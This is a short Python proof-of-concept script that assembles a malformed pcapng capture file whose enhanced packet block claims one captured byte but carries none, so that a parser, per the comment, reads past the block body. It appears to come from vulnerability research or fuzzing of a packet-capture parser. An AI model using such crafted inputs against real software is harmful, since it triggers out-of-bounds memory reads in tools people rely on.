import struct, pathlib

def blk(t, body):
    total=12+len(body)
    pad=(4-total%4)%4
    total+=pad
    return struct.pack('<II', t, total)+body+b'\x00'*pad+struct.pack('<I', total)
shb=blk(0x0A0D0D0A, struct.pack('<IHHq', 0x1A2B3C4D, 1, 0, -1))
idb=blk(1, struct.pack('<HHI', 1, 0, 65535))
# EPB with captured len 1 but no packet bytes; parser will memcpy 1 byte from beyond body
body=struct.pack('<IIIIII', 0,0,0,1,1,0)
epb=blk(6, body)
path=pathlib.Path('/workspace/poc6.pcapng')
path.write_bytes(shb+idb+epb)
print(path, path.stat().st_size)
